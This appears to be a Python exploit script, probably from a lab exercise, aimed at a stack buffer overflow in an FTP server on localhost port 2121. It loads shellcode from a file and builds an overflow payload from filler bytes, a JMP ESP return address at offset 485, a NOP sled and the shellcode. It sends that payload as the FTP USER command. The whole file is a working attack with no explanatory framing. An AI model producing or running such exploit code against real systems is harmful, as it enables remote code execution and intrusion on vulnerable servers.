import struct
import socket

def get_shellcode():
	start_sequence = b"\x11\x45\x14"
	end_sequence = b"\x19\x19\x08\x10"
	with open("shellcode.bin", "rb") as binf:
		binraw = binf.read()

	start_index = binraw.find(start_sequence)
	if start_index == -1:
		print("Unable to find the start seq")
		exit()
	end_index = binraw.find(end_sequence, start_index + len(start_sequence))
	if end_index == -1:
		print("Unable to find the end seq")
		exit()

	return binraw[start_index + len(start_sequence):end_index]

if __name__ == '__main__':
	eip_offset = 485
	esp_offset = 493
	jmp_esp_instr_addr = 0x7ffa4512
	shellcode = get_shellcode()
	
	exploit_buf = b'A' * eip_offset \
		+ struct.pack('<I', jmp_esp_instr_addr) \
		+ b'\x90' * (esp_offset - eip_offset - 4) \
		+ shellcode
	print('Length of payload: ', len(exploit_buf))

	ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ftp.connect(('127.0.0.1', 2121))
	ftp.recv(1024)
	try:
		ftp.sendall(b'USER ' + exploit_buf + b'\r\n')
		ftp.recv(1024)
		ftp.sendall(b'PASS aaa\r\n')
		ftp.recv(1024)
		ftp.close()
	except socket.error:
		pass
